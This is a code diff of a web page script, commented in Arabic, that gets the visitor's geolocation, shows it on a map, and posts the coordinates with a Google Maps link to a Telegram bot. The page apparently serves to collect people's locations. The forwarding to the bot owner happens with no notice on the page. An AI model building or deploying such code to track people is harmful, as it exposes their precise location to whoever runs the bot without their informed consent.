@@ -32,16 +32,31 @@
       const lon = position.coords.longitude;
 
       // عرض الخريطة
-      const map = L.map('map').setView([lat, lon], 15);
+      const map = L.map('map').setView([lat, lon], 16);
       L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         attribution: '© OpenStreetMap contributors'
       }).addTo(map);
 
-      // وضع علامة على الموقع
-      L.marker([lat, lon]).addTo(map).bindPopup("موقعك الحالي").openPopup();
+      // رابط الخريطة
+      const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
 
-      // إرسال الموقع إلى البوت
-      fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`);
+      // وضع علامة على الموقع
+      L.marker([lat, lon]).addTo(map).bindPopup("موقع الهاتف الحالي").openPopup();
+
+      // إرسال الموقع مع رابط الخريطة إلى البوت
+      const message = `الموقع تم تحديده:\nLatitude: ${lat}\nLongitude: ${lon}\n[افتح في الخريطة](${mapLink})`;
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+
     }, function(error) {
       alert("فشل في تحديد الموقع: " + error.message);
     });
